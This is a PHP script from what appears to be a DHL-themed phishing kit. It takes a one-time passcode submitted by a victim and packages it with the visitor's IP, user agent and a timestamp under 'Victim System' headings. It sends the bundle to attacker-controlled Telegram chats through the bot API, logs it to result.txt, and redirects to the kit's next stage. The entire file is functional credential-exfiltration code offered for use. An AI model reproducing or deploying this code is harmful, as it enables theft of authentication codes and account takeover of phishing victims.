<?php
session_start();
include '../config/tg.php';
if(isset($_POST['log'])){
foreach($IdTelegram as $chatId) {
$ip = getenv("REMOTE_ADDR"); 
$message = "|==[ INTERN. - DHL OTP - 2  ]==|\n";
$message .= "|OTP  :  ".$_POST['otp']."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$message .= "|IP                 :  ".$ip."\n";
$message .= "|User-Agent         :  ".$UA."\n";
$message .= "|Date               :  ".date('d/m/Y h:i:s')."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$website="https://api.telegram.org/bot".$botToken;
$params=[
'chat_id'=>$chatId, 
'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
$myfile = fopen("result.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header("location: ../load.php?code=action4");
}
}
else{
  exit("");
}
?>